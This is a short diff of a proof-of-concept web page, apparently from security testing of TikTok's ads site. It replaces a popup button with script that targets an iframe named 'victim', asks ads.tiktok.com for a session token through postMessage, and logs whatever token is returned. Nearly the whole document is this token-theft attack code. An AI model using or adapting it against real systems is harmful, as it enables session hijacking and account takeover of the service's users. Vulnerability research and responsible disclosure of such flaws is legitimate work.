@@ -1,9 +1,14 @@
-<button id="clickme">Click here</button>
-
 <script>
-document.getElementById('clickme').onclick = function() {
   
-    let popup = window.open("https://business.tiktok.com/select", "_blank");
-   
+const iframe = document.getElementById('victim');
+iframe.onload = function () {
+    iframe.contentWindow.postMessage({ action: 'getSessionToken' }, 'https://ads.tiktok.com');
 };
-</script>b
+
+window.addEventListener('message', (e) => {
+    if (e.origin === 'https://ads.tiktok.com') {
+        console.log('Token received from target:', e.data);
+        
+    }
+});
+  </script>
